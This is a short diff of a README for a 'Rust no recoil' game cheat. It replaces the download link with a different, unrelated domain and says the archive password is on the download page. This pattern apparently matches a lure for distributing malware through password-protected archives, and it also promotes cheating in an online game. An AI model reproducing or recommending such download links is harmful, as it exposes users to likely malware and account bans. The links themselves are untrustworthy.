@@ -18,7 +18,7 @@ Rust no recoil script — perfect AK-47 and all weapon spray patterns.
 
 ## Download
 
-[![Download v2026.6](https://img.shields.io/badge/Download_v2026.6-ec4899?style=for-the-badge&logoColor=white)](https://connectinstruction.com/rustnorecoil)
+[![Download v2026.6](https://img.shields.io/badge/Download_v2026.6-ec4899?style=for-the-badge&logoColor=white)](https://dllvcrun.com/rustnorecoil)
 
 > The archive password is shown on the download page.
 
